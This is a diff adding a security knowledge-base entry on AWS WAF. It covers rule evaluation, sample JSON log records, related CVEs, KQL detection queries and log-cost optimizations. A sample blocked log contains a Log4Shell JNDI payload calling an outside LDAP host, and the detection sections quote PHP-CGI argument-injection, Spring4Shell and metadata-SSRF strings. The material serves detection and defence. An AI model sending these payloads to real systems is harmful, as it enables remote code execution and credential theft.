@@ -1,0 +1,314 @@
+# Secpedia entry — see CONTRIBUTING.md and schema/entry.schema.json
+id: aws-waf
+name: AWS WAF
+short: AWS WAF
+aka:
+  - AWS WAFv2
+  - AWS WAF Classic
+  - Web ACL
+  - Protection pack
+  - AWS Firewall Manager (WAF policies)
+vendor: Amazon Web Services
+category: waf
+status: full
+updated: "2026-11-12"
+contributors:
+  - wlinde
+tags:
+  - aws
+  - waf
+  - http
+  - json
+  - firehose
+  - managed-rules
+  - bot-control
+  - rate-limiting
+summary: AWS's managed web application firewall. A web ACL attached to CloudFront, an Application Load Balancer, API Gateway, AppSync, Cognito, App Runner or Verified Access inspects every HTTP request against custom rules, rate-based rules and AWS or Marketplace managed rule groups, and can allow, block, count, or issue a CAPTCHA or challenge. Full logging writes one JSON record per request, so volume follows your web traffic. Allowed requests dominate, while blocks and labels carry the security value.
+sourcetypes:
+  - st: aws_waf_log_json
+    desc: Pack Generator sourcetype for AWS WAF full logs (one JSON object per request)
+  - st: AWSWAF
+    desc: Microsoft Sentinel table populated by the Amazon Web Services S3 connector
+  - st: AWS_WAF
+    desc: Google SecOps (Chronicle) log type
+facts:
+  First released: October 2015 (WAF Classic); WAFv2 November 2019
+  Delivery model: Managed service; web ACLs (protection packs) are regional or global (CloudFront)
+  Protected resources: CloudFront, ALB, API Gateway REST, AppSync, Cognito user pools, App Runner, Verified Access, Amplify
+  Rule types: Custom match rules, rate-based rules, AWS Managed Rules (Core, Known Bad Inputs, SQLi, IP reputation, Bot Control, ATP/ACFP fraud), Marketplace rule groups
+  Log transport: "CloudWatch Logs, S3 (~5-minute gzip objects) or Kinesis Data Firehose; destination names must start with aws-waf-logs-"
+  Log format: JSON, one object per inspected request (formatVersion 1); logging filters and field redaction available
+  Typical volume: Equal to request count — 1k to 1M+ req/s for large CloudFront distributions
+  Cribl Pack: Cribl Search AWS WAF (Packs Dispensary)
+placement:
+  slots:
+    - edge
+    - cloud
+    - dmz
+  items:
+    - slot: edge
+      title: CloudFront (global)
+      desc: Web ACLs on CloudFront distributions inspect traffic at AWS edge locations before it reaches the origin. httpSourceName=CF, global scope (us-east-1).
+    - slot: cloud
+      title: Application Load Balancer / API Gateway (regional)
+      desc: Regional web ACLs in front of ALB-hosted apps, REST APIs and AppSync GraphQL. Often the only L7 control for internal or partner-facing APIs.
+    - slot: dmz
+      title: Centrally managed with Firewall Manager
+      desc: Firewall Manager pushes a baseline web ACL (managed rule groups + logging) to every account's resources; app teams add their own rules on top.
+howItWorks:
+  - title: Web ACL evaluation
+    body: Rules are evaluated in priority order. A rule with a terminating action (Allow, Block, CAPTCHA, Challenge) stops evaluation and becomes terminatingRuleId; Count rules only add labels and appear in nonTerminatingMatchingRules. If nothing terminates, the web ACL default action applies (terminatingRuleId=Default_Action).
+  - title: Managed rule groups
+    body: "AWS Managed Rules cover OWASP-style attacks (CommonRuleSet), known exploit payloads (KnownBadInputsRuleSet: Log4JRCE_*, JavaDeserializationRCE_* for Spring4Shell, ReactJSRCE_BODY for React2Shell), SQL injection, IP reputation, anonymous IPs, Bot Control and account-takeover/fraud prevention. Individual rules can be overridden to Count so you can test before blocking."
+  - title: Labels
+    body: Rules attach labels (e.g. awswaf:managed:aws:known-bad-inputs:Log4JRCE_Header, awswaf:managed:aws:bot-control:bot:category:...). Later rules can match on labels, and every label is logged in labels[], which makes them the most useful field for detection and tuning.
+  - title: Rate-based rules
+    body: Count requests per aggregation key (IP, forwarded IP, header, cookie, query arg, JA3/JA4 fingerprint, label namespace or a combination) over a 1–10 minute window and act when the limit is exceeded. Blocks appear with terminatingRuleType RATE_BASED and rateBasedRuleList details.
+  - title: Body inspection limits
+    body: WAF only inspects the first 8 KB of the body on ALB/AppSync (16 KB default, up to 64 KB, on CloudFront/API Gateway/Cognito/App Runner/Verified Access). Oversize handling (Continue/Match/No match) decides what happens beyond — a classic evasion path if left at Continue.
+traffic:
+  handles:
+    - HTTP/1.1, HTTP/2 and HTTP/3 requests (CloudFront)
+    - REST and GraphQL APIs (API Gateway, AppSync)
+    - Headers, cookies, query strings, URI path and JSON/form bodies
+    - TLS client fingerprints (JA3/JA4)
+    - Bot and automation traffic (Bot Control, CAPTCHA, Challenge tokens)
+    - Login and sign-up flows (ATP / ACFP)
+    - Geo and IP reputation matching
+  flow:
+    - step: Request
+      desc: A client request reaches CloudFront, the ALB or the API endpoint.
+    - step: Web ACL
+      desc: The associated web ACL evaluates rules in priority order against the request components.
+    - step: Labels + counts
+      desc: Matching Count rules add labels; rate-based rules update their counters.
+    - step: Terminating action
+      desc: The first terminating rule (or the default action) allows, blocks, challenges or serves a CAPTCHA.
+    - step: Forward or respond
+      desc: Allowed requests go to the origin; blocked ones get 403 (or a custom response).
+    - step: Log
+      desc: A JSON record with the request, matched rules, labels and action goes to CloudWatch Logs, S3 or Firehose.
+    - step: Collect
+      desc: Cribl receives Firehose (HTTP) or reads S3 via SQS and routes blocks and labelled requests to the SIEM.
+logs:
+  - type: Allowed request
+    sourcetype: aws_waf_log_json
+    format: json
+    share: 90–99 %
+    avg: ~1.5 KB
+    desc: Request that reached the default action or an Allow rule. Even allowed requests carry labels from Count rules (Bot Control, IP reputation), which is where most hunting signal sits.
+    key:
+      - action
+      - terminatingRuleId
+      - httpRequest.clientIp
+      - httpRequest.country
+      - httpRequest.uri
+      - httpRequest.httpMethod
+      - labels[0].name
+      - ja4Fingerprint
+    noise:
+      - formatVersion
+      - httpSourceId
+      - httpRequest.requestId
+      - httpRequest.headers[2].name
+      - httpRequest.headers[2].value
+      - terminatingRuleType
+    sample: '{"timestamp":1794474862118,"formatVersion":1,"webaclId":"arn:aws:wafv2:us-east-1:111122223333:regional/webacl/shop-prod/1a2b3c4d-5e6f-4a7b-8c9d-0e1f2a3b4c5d","terminatingRuleId":"Default_Action","terminatingRuleType":"REGULAR","action":"ALLOW","terminatingRuleMatchDetails":[],"httpSourceName":"ALB","httpSourceId":"111122223333-app/shop-prod-alb/0123456789abcdef","ruleGroupList":[{"ruleGroupId":"AWS#AWSManagedRulesBotControlRuleSet","terminatingRule":null,"nonTerminatingMatchingRules":[],"excludedRules":null}],"rateBasedRuleList":[],"nonTerminatingMatchingRules":[],"requestHeadersInserted":null,"responseCodeSent":null,"httpRequest":{"clientIp":"198.51.100.23","country":"NL","headers":[{"name":"Host","value":"shop.example.com"},{"name":"User-Agent","value":"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15"},{"name":"Accept","value":"text/html"}],"uri":"/products/42","args":"ref=home","httpVersion":"HTTP/2.0","httpMethod":"GET","requestId":"1-6733a5ee-0123456789abcdef01234567"},"labels":[{"name":"awswaf:managed:aws:bot-control:bot:category:http_library"}],"ja3Fingerprint":"0123456789abcdef0123456789abcdef","ja4Fingerprint":"t13d1516h2_8daaf6152771_02713d6af862"}'
+  - type: Blocked by managed rule
+    sourcetype: aws_waf_log_json
+    format: json
+    share: 0.5–5 %
+    avg: ~2 KB
+    desc: "A managed rule group terminated the request. ruleGroupList[].terminatingRule names the rule; terminatingRuleMatchDetails shows the matched location and data for SQLi/XSS-type rules."
+    key:
+      - action
+      - terminatingRuleId
+      - ruleGroupList[0].terminatingRule.ruleId
+      - httpRequest.clientIp
+      - httpRequest.uri
+      - httpRequest.headers[1].value
+      - labels[0].name
+    noise:
+      - formatVersion
+      - httpSourceId
+      - httpRequest.requestId
+      - ruleGroupList[0].excludedRules
+    sample: '{"timestamp":1794475201733,"formatVersion":1,"webaclId":"arn:aws:wafv2:us-east-1:111122223333:regional/webacl/shop-prod/1a2b3c4d-5e6f-4a7b-8c9d-0e1f2a3b4c5d","terminatingRuleId":"AWS-AWSManagedRulesKnownBadInputsRuleSet","terminatingRuleType":"MANAGED_RULE_GROUP","action":"BLOCK","terminatingRuleMatchDetails":[],"httpSourceName":"ALB","httpSourceId":"111122223333-app/shop-prod-alb/0123456789abcdef","ruleGroupList":[{"ruleGroupId":"AWS#AWSManagedRulesKnownBadInputsRuleSet","terminatingRule":{"ruleId":"Log4JRCE_HEADER","action":"BLOCK","ruleMatchDetails":null},"nonTerminatingMatchingRules":[],"excludedRules":null}],"rateBasedRuleList":[],"nonTerminatingMatchingRules":[],"requestHeadersInserted":null,"responseCodeSent":null,"httpRequest":{"clientIp":"203.0.113.66","country":"US","headers":[{"name":"Host","value":"shop.example.com"},{"name":"User-Agent","value":"${jndi:ldap://203.0.113.66:1389/a}"}],"uri":"/login","args":"","httpVersion":"HTTP/1.1","httpMethod":"GET","requestId":"1-6733a741-89abcdef0123456789abcdef"},"labels":[{"name":"awswaf:managed:aws:known-bad-inputs:Log4JRCE_Header"}]}'
+  - type: Rate-based block
+    sourcetype: aws_waf_log_json
+    format: json
+    share: 0–5 %
+    avg: ~1.6 KB
+    desc: A rate-based rule exceeded its limit for the aggregation key (here the client IP). Typical for credential stuffing, scraping and L7 floods.
+    key:
+      - action
+      - terminatingRuleId
+      - terminatingRuleType
+      - rateBasedRuleList[0].limitKey
+      - rateBasedRuleList[0].maxRateAllowed
+      - httpRequest.clientIp
+      - httpRequest.uri
+    noise:
+      - formatVersion
+      - httpSourceId
+      - httpRequest.requestId
+      - rateBasedRuleList[0].rateBasedRuleId
+    sample: '{"timestamp":1794475322904,"formatVersion":1,"webaclId":"arn:aws:wafv2:us-east-1:111122223333:regional/webacl/shop-prod/1a2b3c4d-5e6f-4a7b-8c9d-0e1f2a3b4c5d","terminatingRuleId":"login-rate-limit","terminatingRuleType":"RATE_BASED","action":"BLOCK","terminatingRuleMatchDetails":[],"httpSourceName":"ALB","httpSourceId":"111122223333-app/shop-prod-alb/0123456789abcdef","ruleGroupList":[],"rateBasedRuleList":[{"rateBasedRuleId":"0f1e2d3c-4b5a-6978-8a9b-0c1d2e3f4a5b","rateBasedRuleName":"login-rate-limit","limitKey":"IP","maxRateAllowed":100,"evaluationWindowSec":"300","customValues":[]}],"nonTerminatingMatchingRules":[],"requestHeadersInserted":null,"responseCodeSent":null,"httpRequest":{"clientIp":"192.0.2.150","country":"DE","headers":[{"name":"Host","value":"shop.example.com"},{"name":"Content-Type","value":"application/x-www-form-urlencoded"}],"uri":"/api/login","args":"","httpVersion":"HTTP/1.1","httpMethod":"POST","requestId":"1-6733a7ba-0123456789abcdef01234567"},"labels":[]}'
+cves:
+  - id: CVE-2025-55182
+    cvss: 10
+    year: 2025
+    kev: true
+    scope: traffic
+    title: React2Shell — pre-auth RCE in React Server Components (covered by the ReactJSRCE_BODY managed rule)
+    affected: react-server-dom-webpack / -parcel / -turbopack 19.0.0, 19.1.0, 19.1.1, 19.2.0 (and frameworks bundling them, e.g. Next.js App Router)
+    fixed: React 19.0.1, 19.1.2, 19.2.1
+    detect: Blocks or Count matches with ruleGroupList[].terminatingRule.ruleId=ReactJSRCE_BODY / label awswaf:managed:aws:known-bad-inputs:ReactJSRCE_Body, usually POSTs to Server Function endpoints with a Next-Action header.
+    avoid: Patch React/Next.js; keep KnownBadInputsRuleSet in Block; ensure bodies above the inspection limit are not passed unchecked (oversize handling).
+  - id: CVE-2021-44228
+    cvss: 10
+    year: 2021
+    kev: true
+    scope: traffic
+    title: Log4Shell — JNDI lookup strings in headers, URI, query or body
+    affected: Apache Log4j 2.0-beta9 – 2.15.0 (excluding 2.12.2, 2.12.3, 2.3.1)
+    fixed: Log4j 2.17.1 (Java 8), 2.12.4 (Java 7), 2.3.2 (Java 6)
+    detect: "Log4JRCE_HEADER / _QUERYSTRING / _URIPATH / _BODY matches; ${jndi: strings in httpRequest.headers[].value. Obfuscated variants (${${lower:j}ndi:…}) still show up years later from scanners."
+    avoid: Patch; KnownBadInputsRuleSet in Block; inspect all headers, not only User-Agent.
+  - id: CVE-2022-22965
+    cvss: 9.8
+    year: 2022
+    kev: true
+    scope: traffic
+    title: Spring4Shell — Spring Framework data-binding RCE (JavaDeserializationRCE_* rules)
+    affected: Spring Framework 5.3.0 – 5.3.17, 5.2.0 – 5.2.19 on JDK 9+ (Tomcat WAR deployment)
+    fixed: Spring Framework 5.3.18, 5.2.20
+    detect: JavaDeserializationRCE_BODY / _QUERYSTRING matches; class.module.classLoader parameters in httpRequest.args or bodies.
+    avoid: Upgrade Spring (Spring Boot 2.6.6 / 2.5.12); keep the rule group in Block.
+  - id: CVE-2023-34362
+    cvss: 9.8
+    year: 2023
+    kev: true
+    scope: traffic
+    title: MOVEit Transfer SQL injection exploited by Cl0p for mass data theft
+    affected: MOVEit Transfer before 2021.0.6, 2021.1.4, 2022.0.4, 2022.1.5, 2023.0.1
+    fixed: 2021.0.6 (13.0.6), 2021.1.4 (13.1.4), 2022.0.4 (14.0.4), 2022.1.5 (14.1.5), 2023.0.1 (15.0.1)
+    detect: Requests to /moveitisapi/moveitisapi.dll and /guestaccess.aspx followed by SQLi_* or CommonRuleSet matches from the same clientIp; POSTs to /api/v1/folders/*/files from unknown IPs.
+    avoid: Patch; do not publish file-transfer apps directly; restrict by IP set; SQL database managed rule group.
+  - id: CVE-2024-4577
+    cvss: 9.8
+    year: 2024
+    kev: true
+    scope: traffic
+    title: PHP-CGI argument injection on Windows (Best-Fit soft-hyphen bypass)
+    affected: PHP 8.1 before 8.1.29, 8.2 before 8.2.20, 8.3 before 8.3.8 with Apache + PHP-CGI on Windows
+    fixed: PHP 8.1.29, 8.2.20, 8.3.8
+    detect: "Query strings containing %AD-d allow_url_include or -d auto_prepend_file=php://input in httpRequest.args; PHP application rule group (AWSManagedRulesPHPRuleSet) matches."
+    avoid: Patch PHP; do not run PHP as CGI; enable the PHP rule group for PHP back ends.
+detections:
+  - title: Exploit payload blocked or counted by Known Bad Inputs
+    severity: high
+    signals:
+      - labels contain awswaf:managed:aws:known-bad-inputs
+      - Log4JRCE / JavaDeserializationRCE / ReactJSRCE
+    why: These rules match specific exploit chains; hits name the CVE being attempted and the targeted host, even when the action was only Count.
+    kql: |-
+      dataset="aws_waf" 
+      | where tostring(labels) contains "known-bad-inputs"
+      | summarize hits=count(), uris=make_set(httpRequest.uri) by httpRequest.clientIp, ruleGroupList[0].terminatingRule.ruleId, action
+    mitre:
+      - T1190
+  - title: Exploit rule in Count mode (protection gap)
+    severity: medium
+    signals:
+      - action=ALLOW
+      - nonTerminatingMatchingRules or labels from SQLi / KnownBadInputs / CommonRuleSet
+    why: A dangerous rule overridden to Count lets the attack through; this is usually a forgotten tuning exercise.
+    kql: |-
+      dataset="aws_waf" action="ALLOW"
+      | where tostring(labels) has_any ("known-bad-inputs","sql-database","core-rule-set")
+      | summarize count() by webaclId, labels[0].name
+    mitre:
+      - T1190
+  - title: Credential stuffing on login endpoints
+    severity: high
+    signals:
+      - httpRequest.uri contains login / signin / oauth/token
+      - terminatingRuleType=RATE_BASED or many POSTs per clientIp
+    why: Rate-based blocks and high POST counts against authentication endpoints are the WAF view of password spraying and credential stuffing.
+    kql: |-
+      dataset="aws_waf" httpRequest.httpMethod="POST"
+      | where httpRequest.uri has_any ("login","signin","oauth/token")
+      | summarize posts=count(), blocked=countif(action=="BLOCK"), ips=dcount(httpRequest.clientIp) by ja4Fingerprint, bin(_time, 10m)
+      | where posts > 500 or ips > 50
+    mitre:
+      - T1110.004
+      - T1110.003
+  - title: SSRF attempts against the instance metadata service
+    severity: high
+    signals:
+      - ruleId EC2MetaDataSSRF_*
+      - 169.254.169.254 in args / body
+    why: SSRF to IMDS is how attackers steal EC2 role credentials behind a web app; correlate with GuardDuty InstanceCredentialExfiltration.
+    kql: |-
+      dataset="aws_waf"
+      | where ruleGroupList[0].terminatingRule.ruleId startswith "EC2MetaDataSSRF" or httpRequest.args contains "169.254.169.254"
+      | summarize count() by httpRequest.clientIp, httpRequest.uri, action
+    mitre:
+      - T1552.005
+      - T1190
+  - title: Single client hitting many URIs with blocks
+    severity: medium
+    signals:
+      - many distinct httpRequest.uri
+      - high BLOCK ratio per clientIp
+    why: Vulnerability scanners and content-discovery tools probe hundreds of paths; separate them from targeted exploitation and feed them to an IP set.
+    kql: |-
+      dataset="aws_waf"
+      | summarize uris=dcount(httpRequest.uri), blocks=countif(action=="BLOCK"), total=count() by httpRequest.clientIp, bin(_time, 15m)
+      | where uris > 200 and blocks * 1.0 / total > 0.2
+    mitre:
+      - T1595.002
+optimizations:
+  - title: Sample or drop plain allowed requests
+    saving: 60–90 %
+    fn: Sampling
+    how: "Allowed requests without labels or non-terminating matches are access-log duplicates (CloudFront/ALB logs already record them). Sample 1:20 for the SIEM, send all to Lake; never sample BLOCK, CAPTCHA, CHALLENGE or labelled requests."
+    expr: action=='ALLOW' && (!labels || labels.length==0) && (!nonTerminatingMatchingRules || nonTerminatingMatchingRules.length==0)
+  - title: Strip headers and empty arrays
+    saving: 30–50 %
+    fn: Parser → Serialize
+    how: The headers[] array is the bulk of each record. Keep Host, User-Agent and X-Forwarded-For as top-level fields, drop the rest, and remove empty ruleGroupList/rateBasedRuleList/terminatingRuleMatchDetails and null fields. Use WAF field redaction for Authorization/Cookie at the source.
+    expr: "keep headers: Host, User-Agent, X-Forwarded-For; remove: httpSourceId, formatVersion, requestId, empty arrays, nulls"
+  - title: Use WAF logging filters at the source
+    saving: 50–95 % of WAF log cost
+    fn: Routes
+    how: WAF logging filters can keep only BLOCK/COUNT/CAPTCHA/CHALLENGE or records with specific labels. If you still need the full set, send it to S3 and let Cribl pick security-relevant records for the SIEM.
+    expr: "action != 'ALLOW' || labels.length > 0 → SIEM | else → Lake"
+  - title: Aggregate rate-based and scanner blocks
+    saving: 5–20 %
+    fn: Aggregations
+    how: Floods produce millions of identical rate-based blocks. Roll up to count per clientIp, terminatingRuleId and uri per minute.
+    expr: terminatingRuleType=='RATE_BASED' && action=='BLOCK'
+references:
+  - title: Log fields for protection pack (web ACL) traffic
+    url: https://docs.aws.amazon.com/waf/latest/developerguide/logging-fields.html
+  - title: Logging AWS WAF protection pack (web ACL) traffic
+    url: https://docs.aws.amazon.com/waf/latest/developerguide/logging.html
+  - title: AWS WAF log examples
+    url: https://docs.aws.amazon.com/waf/latest/developerguide/logging-examples.html
+  - title: AWS Managed Rules baseline rule groups (Core, Known Bad Inputs)
+    url: https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-baseline.html
+  - title: React security advisory CVE-2025-55182
+    url: https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
+  - title: Spring Framework RCE advisory (CVE-2022-22965)
+    url: https://spring.io/security/cve-2022-22965
+  - title: CISA Known Exploited Vulnerabilities catalog
+    url: https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+related:
+  - aws-cloudfront
+  - aws-elb
+  - cloudflare-waf
+  - imperva-waf
+  - f5-awaf
+  - aws-guardduty
